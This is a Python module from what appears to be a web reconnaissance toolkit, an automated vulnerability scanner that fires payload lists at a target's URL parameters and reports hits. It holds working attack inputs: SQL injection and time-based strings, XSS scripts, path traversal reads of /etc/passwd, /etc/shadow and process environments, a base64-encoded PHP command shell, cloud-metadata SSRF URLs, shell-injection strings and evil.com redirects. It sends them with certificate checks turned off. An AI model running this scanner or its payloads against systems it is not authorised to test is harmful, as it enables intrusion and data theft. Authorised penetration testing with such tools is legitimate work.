"""
Vulnerability Scanner Module
Fast first-pass detection for:
- SQL Injection (error-based + time-based)
- XSS (reflected)
- LFI / Path Traversal
- Open Redirect
- SSRF
- Command Injection
Not a replacement for Burp Suite — finds low-hanging fruit automatically.
"""

import httpx
import asyncio
import re
import time
import threading
from lucuiec_recon.utils.output import print_found, print_info, print_warn, print_critical

_lock = threading.Lock()

# ── Payloads ────────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' AND SLEEP(3)--",
    "1; WAITFOR DELAY '0:0:3'--",  # MSSQL
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "1' ORDER BY 1--",
    "' UNION SELECT NULL--",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ORA-", "PostgreSQL",
    "sqlite_", "SQLSTATE", "syntax error", "unclosed quotation",
    "Microsoft SQL", "DB2 SQL", "Warning: mysql",
    "You have an error in your SQL syntax",
    "quoted string not properly terminated",
    "pg_query", "mysql_num_rows",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "{{7*7}}",          # Template injection
    "${7*7}",           # Template injection
    "#{7*7}",           # Template injection
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "../../etc/passwd",
    "../../../etc/shadow",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "....//....//....//windows/win.ini",
    "C:/Windows/win.ini",
]

LFI_INDICATORS = [
    "root:x:0:0", "daemon:", "bin:x:", "/bin/bash",
    "[fonts]", "[extensions]", "for 16-bit app",
    "root:!:", "nobody:x:", "DOCUMENT_ROOT=",
]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "/\\evil.com",
    "https:evil.com",
    "javascript:alert(1)",
    "%2f%2fevil.com",
    "https%3A%2F%2Fevil.com",
]

REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirect_uri",
    "return", "return_url", "next", "next_url",
    "goto", "go", "target", "dest", "destination",
    "back", "forward", "link", "location", "path",
    "continue", "redir", "r", "u",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",   # AWS metadata
    "http://169.254.169.254/computeMetadata/v1/",  # GCP metadata
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://internal/",
]

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "` id`",
    "$(id)",
    "; sleep 3",
    "| sleep 3",
    "; cat /etc/passwd",
    "& whoami &",
    "|| id",
]

CMDI_INDICATORS = ["uid=", "root", "www-data", "apache", "nobody"]


async def test_sqli(client: httpx.AsyncClient, url: str, param: str,
                    original_val: str, results: list, semaphore: asyncio.Semaphore):
    """Test a parameter for SQL injection."""
    async with semaphore:
        for payload in SQLI_PAYLOADS[:5]:  # Limit payloads for speed
            test_url = url.replace(f"{param}={original_val}",
                                   f"{param}={original_val}{payload}")
            try:
                start = time.time()
                resp = await client.get(test_url, follow_redirects=True)
                elapsed = time.time() - start
                body = resp.text.lower()

                # Error-based SQLi
                for error in SQLI_ERRORS:
                    if error.lower() in body:
                        with _lock:
                            results.append({
                                "type": "SQLi", "severity": "CRITICAL",
                                "url": test_url, "param": param,
                                "payload": payload, "evidence": error,
                            })
                            print_critical(
                                f"[SQLi] 🔥 POSSIBLE SQL INJECTION!\n"
                                f"        URL    : {test_url}\n"
                                f"        Param  : {param}\n"
                                f"        Payload: {payload}\n"
                                f"        Evidence: {error}"
                            )
                        return

                # Time-based SQLi
                if "SLEEP" in payload and elapsed > 2.5:
                    with _lock:
                        results.append({
                            "type": "SQLi-Time", "severity": "CRITICAL",
                            "url": test_url, "param": param,
                            "payload": payload,
                            "evidence": f"Response delayed {elapsed:.1f}s",
                        })
                        print_critical(
                            f"[SQLi-TIME] 🔥 TIME-BASED SQL INJECTION!\n"
                            f"        URL   : {test_url}\n"
                            f"        Delay : {elapsed:.1f}s"
                        )
                    return

            except Exception:
                pass


async def test_xss(client: httpx.AsyncClient, url: str, param: str,
                   original_val: str, results: list, semaphore: asyncio.Semaphore):
    """Test a parameter for reflected XSS."""
    async with semaphore:
        for payload in XSS_PAYLOADS[:4]:
            test_url = url.replace(f"{param}={original_val}",
                                   f"{param}={payload}")
            try:
                resp = await client.get(test_url, follow_redirects=True)
                if payload in resp.text or payload.lower() in resp.text.lower():
                    with _lock:
                        results.append({
                            "type": "XSS", "severity": "HIGH",
                            "url": test_url, "param": param, "payload": payload,
                        })
                        print_critical(
                            f"[XSS] 🔥 REFLECTED XSS!\n"
                            f"       URL    : {test_url}\n"
                            f"       Param  : {param}\n"
                            f"       Payload: {payload}"
                        )
                    return
                # Template injection check
                if "49" in resp.text and "{{7*7}}" in payload:
                    with _lock:
                        results.append({
                            "type": "SSTI", "severity": "CRITICAL",
                            "url": test_url, "param": param, "payload": payload,
                        })
                        print_critical(f"[SSTI] 🔥 SERVER-SIDE TEMPLATE INJECTION! {test_url}")
            except Exception:
                pass


async def test_lfi(client: httpx.AsyncClient, url: str, param: str,
                   original_val: str, results: list, semaphore: asyncio.Semaphore):
    """Test a parameter for Local File Inclusion."""
    async with semaphore:
        for payload in LFI_PAYLOADS[:6]:
            test_url = url.replace(f"{param}={original_val}",
                                   f"{param}={payload}")
            try:
                resp = await client.get(test_url, follow_redirects=True)
                for indicator in LFI_INDICATORS:
                    if indicator in resp.text:
                        with _lock:
                            results.append({
                                "type": "LFI", "severity": "CRITICAL",
                                "url": test_url, "param": param,
                                "payload": payload, "evidence": indicator,
                            })
                            print_critical(
                                f"[LFI] 🔥 LOCAL FILE INCLUSION!\n"
                                f"       URL      : {test_url}\n"
                                f"       Param    : {param}\n"
                                f"       Evidence : {indicator}"
                            )
                        return
            except Exception:
                pass


def test_open_redirect(base_url: str, params: list) -> list:
    """Test URL parameters for open redirect."""
    findings = []
    for param in REDIRECT_PARAMS:
        for payload in REDIRECT_PAYLOADS[:4]:
            if "?" in base_url:
                test_url = f"{base_url}&{param}={payload}"
            else:
                test_url = f"{base_url}?{param}={payload}"
            try:
                resp = httpx.get(test_url, timeout=6.0, verify=False,
                                 follow_redirects=False)
                location = resp.headers.get("location", "")
                if resp.status_code in [301, 302, 303, 307, 308]:
                    if "evil.com" in location or payload in location:
                        findings.append({
                            "type": "OpenRedirect", "severity": "MEDIUM",
                            "url": test_url, "param": param,
                            "payload": payload, "location": location,
                        })
                        print_critical(
                            f"[REDIRECT] 🔥 OPEN REDIRECT!\n"
                            f"            URL      : {test_url}\n"
                            f"            Param    : {param}\n"
                            f"            Redirects: {location}"
                        )
            except Exception:
                pass
    return findings


async def _async_vuln_scan(urls_with_params: list, concurrency: int) -> list:
    """Run all vuln tests asynchronously."""
    results = []
    semaphore = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False, timeout=httpx.Timeout(10.0),
        limits=httpx.Limits(max_connections=concurrency),
    ) as client:
        tasks = []
        for entry in urls_with_params:
            url = entry["url"]
            for param, val in entry.get("params", {}).items():
                tasks += [
                    test_sqli(client, url, param, val, results, semaphore),
                    test_xss(client, url, param, val, results, semaphore),
                    test_lfi(client, url, param, val, results, semaphore),
                ]
        await asyncio.gather(*tasks)

    return results


def extract_params_from_urls(urls: list) -> list:
    """Extract URLs that have GET parameters."""
    result = []
    for url in urls:
        if "?" in url:
            base = url.split("?")[0]
            query = url.split("?")[1]
            params = {}
            for part in query.split("&"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    params[k] = v
            if params:
                result.append({"url": url, "params": params})
    return result


def run(target: str, port: int = 80, use_https: bool = False,
        urls: list = None, forms: list = None,
        concurrency: int = 20) -> dict:
    """Main entry point for vulnerability scanning."""
    scheme = "https" if use_https else "http"
    base_url = (
        f"{scheme}://{target}:{port}"
        if port not in [80, 443]
        else f"{scheme}://{target}"
    )

    print_info(f"Vulnerability scanning: {base_url}")
    print_warn("Scanning for: SQLi, XSS, LFI, Open Redirect, SSTI")

    all_results = []
    urls_to_test = []

    # 1. Extract URLs that already have GET parameters
    if urls:
        param_urls = extract_params_from_urls(urls)
        urls_to_test.extend(param_urls)
        print_info(f"Found {len(param_urls)} crawled URLs with parameters")

        # 2. Also inject common params into ALL crawled pages (php/html pages)
        #    e.g. operatives.php → operatives.php?id=1  operatives.php?search=x
        injectable_params = {"id": "1", "search": "test", "page": "1",
                             "cat": "1", "name": "test", "q": "test",
                             "file": "index", "view": "home", "lang": "en"}
        for crawled_url in (urls or []):
            # Only inject into .php, .asp, .aspx pages and paths without extension
            if any(ext in crawled_url for ext in [".php", ".asp", ".aspx"]) or                ("?" not in crawled_url and "." not in crawled_url.split("/")[-1]):
                if "?" not in crawled_url:
                    urls_to_test.append({"url": crawled_url, "params": injectable_params})
        print_info(f"Total URLs to test: {len(urls_to_test)}")

    # 3. Always test the base URL with common params
    urls_to_test.append({"url": f"{base_url}/?id=1", "params": {"id": "1"}})
    urls_to_test.append({"url": f"{base_url}/?search=test", "params": {"search": "test"}})
    urls_to_test.append({"url": f"{base_url}/?page=1", "params": {"page": "1"}})
    urls_to_test.append({"url": f"{base_url}/?file=index", "params": {"file": "index"}})

    try:
        results = asyncio.run(_async_vuln_scan(urls_to_test, concurrency))
        all_results.extend(results)
    except KeyboardInterrupt:
        print_warn("Vulnerability scan interrupted.")

    # Test open redirects
    redirect_results = test_open_redirect(base_url, [])
    all_results.extend(redirect_results)

    # Summary
    by_type = {}
    for r in all_results:
        by_type.setdefault(r["type"], []).append(r)

    if all_results:
        print_critical(f"\n🔥 VULNERABILITIES FOUND: {len(all_results)}")
        for vtype, items in by_type.items():
            print_critical(f"  {vtype}: {len(items)}")
    else:
        print_info("No obvious vulnerabilities found (manual testing still recommended!)")

    return {"vulnerabilities": all_results, "by_type": by_type}